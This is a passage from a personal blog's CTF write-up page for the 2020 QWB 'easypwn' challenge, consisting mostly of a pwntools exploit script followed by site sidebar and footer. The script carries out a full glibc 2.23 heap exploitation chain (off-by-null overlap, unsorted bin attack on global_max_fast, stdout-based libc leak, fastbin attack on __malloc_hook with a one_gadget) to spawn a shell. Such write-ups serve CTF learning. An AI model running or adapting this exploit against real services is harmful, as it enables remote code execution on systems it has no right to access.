io.sendlineafter(x, y)</span><br><span class="line">ia  =  <span class="keyword">lambda</span> : io.interactive()</span><br><span class="line">c   =  <span class="keyword">lambda</span> : io.close()</span><br><span class="line">li    = <span class="keyword">lambda</span> x : log.info(<span class="string">&#x27;\x1b[01;38;5;214m&#x27;</span> + x + <span class="string">&#x27;\x1b[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf_path  = <span class="string">&#x27;./easypwn&#x27;</span></span><br><span class="line">MODIFY_LD = <span class="number">0</span></span><br><span class="line">arch = <span class="string">&#x27;64&#x27;</span></span><br><span class="line">libc_v = <span class="string">&#x27;2.23&#x27;</span></span><br><span class="line"></span><br><span class="line">ld_path   = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/ld-linux-x86-64.so.2&#x27;</span></span><br><span class="line">libs_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;./libc.so.6&#x27;</span></span><br><span class="line"><span class="comment">#libc_path = &#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/&#x27;</span> + libc_v + <span class="string">&#x27;/&#x27;</span> + arch + <span class="string">&#x27;/lib/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change ld path </span></span><br><span class="line"><span class="keyword">if</span>(MODIFY_LD):</span><br><span class="line">	os.system(<span class="string">&#x27;cp &#x27;</span> + elf_path + <span class="string">&#x27; &#x27;</span> + elf_path + <span class="string">&#x27;.bk&#x27;</span>)</span><br><span class="line">	change_ld_cmd = <span class="string">&#x27;patchelf  --set-interpreter &#x27;</span> + ld_path +<span class="string">&#x27; &#x27;</span> + elf_path</span><br><span class="line">	os.system(change_ld_cmd)</span><br><span class="line">	li(<span class="string">&#x27;modify ld ok!&#x27;</span>)</span><br><span class="line">	exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remote server ip and port</span></span><br><span class="line">server_ip = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">server_port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if local debug</span></span><br><span class="line">LOCAL = <span class="number">1</span></span><br><span class="line">LIBC  = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------func-----------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">db</span>():</span></span><br><span class="line">	<span class="keyword">if</span>(LOCAL):</span><br><span class="line">		gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ad</span>(<span class="params">size</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rm</span>(<span class="params">idx</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md</span>(<span class="params">idx, data</span>):</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">	sa(<span class="string">&#x27;:&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">q</span>():</span></span><br><span class="line">	sla(<span class="string">&#x27;:&#x27;</span>, <span class="built_in">str</span>(<span class="number">5</span>))	</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------exploit--------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span>():</span></span><br><span class="line">	li(<span class="string">&#x27;exploit...&#x27;</span>)</span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 0</span></span><br><span class="line">	ad(<span class="number">0x88</span>) <span class="comment"># idx 1</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 2 f</span></span><br><span class="line">	ad(<span class="number">0xf8</span>) <span class="comment"># idx 3</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 4 f</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># for second attack</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 5</span></span><br><span class="line">	ad(<span class="number">0x88</span>) <span class="comment"># idx 6</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 7 f</span></span><br><span class="line">	ad(<span class="number">0xf8</span>) <span class="comment"># idx 8</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 9 f</span></span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 10 f</span></span><br><span class="line"></span><br><span class="line">	rm(<span class="number">1</span>)</span><br><span class="line">	md(<span class="number">2</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x100</span>)) <span class="comment">#off by null set top chunk pre_inuse bit  as null</span></span><br><span class="line">	<span class="comment"># make chunk 3 merge to chunk 1</span></span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line">	ad(<span class="number">0x88</span>) <span class="comment"># idx 1</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 3, replace chunk 2, two ptr pointer to same memory</span></span><br><span class="line">	<span class="comment"># modify global_max_fast to make a condition for fastbin attack	</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 11 -&gt; old chunk 3 </span></span><br><span class="line">	ad(<span class="number">0x88</span>) <span class="comment"># idx 12 -&gt; old chunk 3</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	rm(<span class="number">6</span>)</span><br><span class="line">	md(<span class="number">7</span>, <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x100</span>))</span><br><span class="line">	rm(<span class="number">8</span>)  <span class="comment"># make chunk 8 merget to chunk 6</span></span><br><span class="line">	ad(<span class="number">0x88</span>) <span class="comment"># idx 6 -&gt; old chunk  6</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 8 -&gt; old chunk 7</span></span><br><span class="line">	ad(<span class="number">0xf8</span>) <span class="comment"># idx 13 -&gt; old chunk 8</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment"># modify global_max_fast = 0x7f</span></span><br><span class="line">	rm(<span class="number">5</span>) <span class="comment">#</span></span><br><span class="line">	rm(<span class="number">3</span>) <span class="comment"># -&gt; old chunk 2</span></span><br><span class="line">	<span class="comment"># make bd pointer to main_arena + 8 (global_max_fast - 0x10)</span></span><br><span class="line">	<span class="comment"># 0x7ffff7dd37f8 &lt;global_max_fast&gt;:       0x0000000000000010      0x0000000000000000</span></span><br><span class="line">	md(<span class="number">2</span>, p64(<span class="number">0</span>) + <span class="string">b&#x27;\x38\x38\n&#x27;</span>)</span><br><span class="line">	<span class="comment">#db()</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 3</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 5</span></span><br><span class="line">	<span class="comment"># unsorted bin attack to modify global_max_fast value as big number(main_arena + 0x58)</span></span><br><span class="line">	rm(<span class="number">3</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="comment"># stage 2</span></span><br><span class="line">	rm(<span class="number">11</span>) <span class="comment"># -&gt; old chunk 3, for cleanning fastbin</span></span><br><span class="line">	rm(<span class="number">7</span>)  <span class="comment">#</span></span><br><span class="line">	md(<span class="number">8</span>, <span class="string">&#x27;\x00\n&#x27;</span>) <span class="comment"># -&gt; chunk 7, make fd -&gt; chunk 2</span></span><br><span class="line">	md(<span class="number">2</span>, <span class="string">&#x27;\xdd\x25\n&#x27;</span>)</span><br><span class="line">	</span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 3 for ajust</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 7 for ajust</span></span><br><span class="line">	<span class="comment"># attack to _IO_2_1_stderr + 157 to leak libc</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 11</span></span><br><span class="line">	p = <span class="string">b&#x27;\x11&#x27;</span> * <span class="number">0x33</span></span><br><span class="line">	p += p64(<span class="number">0xfbad3887</span>)</span><br><span class="line">	p += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">	p += <span class="string">b&#x27;\x40\n&#x27;</span></span><br><span class="line">	md(<span class="number">11</span>, p)</span><br><span class="line">	leak = u64(ru(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-5</span>:] + <span class="string">b&#x27;\x7f\x00\x00&#x27;</span>)</span><br><span class="line">	libc_base = leak - (<span class="number">0x7ffff7fc2640</span> - <span class="number">0x7ffff7c26000</span>)</span><br><span class="line">	li(<span class="string">&#x27;leak: &#x27;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">	li(<span class="string">&#x27;libc_base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	libc.address = libc_base</span><br><span class="line">	one_gadget = libc_base + <span class="number">0x3f42a</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># fastbin attack to malloc_hook - 0x23</span></span><br><span class="line">	rm(<span class="number">2</span>)</span><br><span class="line">	rm(<span class="number">10</span>)</span><br><span class="line">	rm(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 2</span></span><br><span class="line">	md(<span class="number">2</span>, p64(libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x23</span>) + p64(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 5</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 10</span></span><br><span class="line">	ad(<span class="number">0x68</span>) <span class="comment"># idx 14</span></span><br><span class="line"></span><br><span class="line">	p = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x13</span> - <span class="number">8</span>)</span><br><span class="line">	p += p64(one_gadget)</span><br><span class="line">	p += p64(libc.sym[<span class="string">&#x27;realloc&#x27;</span>] + <span class="number">8</span>)</span><br><span class="line">	p += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">	md(<span class="number">14</span>, p)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># get shell</span></span><br><span class="line">	ad(<span class="number">0x10</span>)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">finish</span>():</span></span><br><span class="line">	ia()</span><br><span class="line">	c()</span><br><span class="line"></span><br><span class="line"><span class="comment">#--------------------------main-----------------------------</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span> LOCAL:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path, <span class="string">&quot;LD_PRELOAD&quot;</span> : libc_path&#125; )</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			io = elf.process(env = &#123;<span class="string">&quot;LD_LIBRARY_PATH&quot;</span> : libs_path&#125; )</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		elf = ELF(elf_path)</span><br><span class="line">		io = remote(server_ip, server_port)</span><br><span class="line">		<span class="keyword">if</span> LIBC:</span><br><span class="line">			libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">	exploit()</span><br><span class="line">	finish()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.i0gan.cn/2020/09/16/wp-2020-qwb-easypwn/" data-id="ckhemv81o002bwdcm6r9l54bk" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    
    <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/dev/">dev</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/docker/">docker</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/exploit/">exploit</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/golang/">golang</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/hexo/">hexo</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/life/">life</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/linux/">linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/pwn/">pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/reverse/">reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/summary/">summary</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/vul/">vul</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/android/" rel="tag">android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/awd/" rel="tag">awd</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/dev/" rel="tag">dev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/docker/" rel="tag">docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/golang/" rel="tag">golang</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hexo/" rel="tag">hexo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kernel/" rel="tag">kernel</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/life/" rel="tag">life</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/metasploit/" rel="tag">metasploit</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/pwn-env/" rel="tag">pwn-env</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vul/" rel="tag">vul</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/weekly-summary/" rel="tag">weekly summary</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/android/" style="font-size: 12.5px;">android</a> <a href="/tags/awd/" style="font-size: 10px;">awd</a> <a href="/tags/dev/" style="font-size: 10px;">dev</a> <a href="/tags/docker/" style="font-size: 12.5px;">docker</a> <a href="/tags/golang/" style="font-size: 10px;">golang</a> <a href="/tags/hexo/" style="font-size: 12.5px;">hexo</a> <a href="/tags/kernel/" style="font-size: 12.5px;">kernel</a> <a href="/tags/life/" style="font-size: 15px;">life</a> <a href="/tags/linux/" style="font-size: 17.5px;">linux</a> <a href="/tags/metasploit/" style="font-size: 10px;">metasploit</a> <a href="/tags/pwn/" style="font-size: 12.5px;">pwn</a> <a href="/tags/pwn-env/" style="font-size: 10px;">pwn-env</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/vul/" style="font-size: 10px;">vul</a> <a href="/tags/weekly-summary/" style="font-size: 12.5px;">weekly summary</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/wp/" style="font-size: 20px;">wp</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/09/">September 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/11/08/tiesan-2020/">tiesan-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/08/wp-other/">wp-thb-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/06/wp-nssc-2020/">wp-nssc-2020</a>
          </li>
        
          <li>
            <a href="/2020/11/01/weekly-report-3/">weekly-report-3</a>
          </li>
        
          <li>
            <a href="/2020/11/01/wp-xhb-2020/">湖湘杯2020</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 i0gan<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>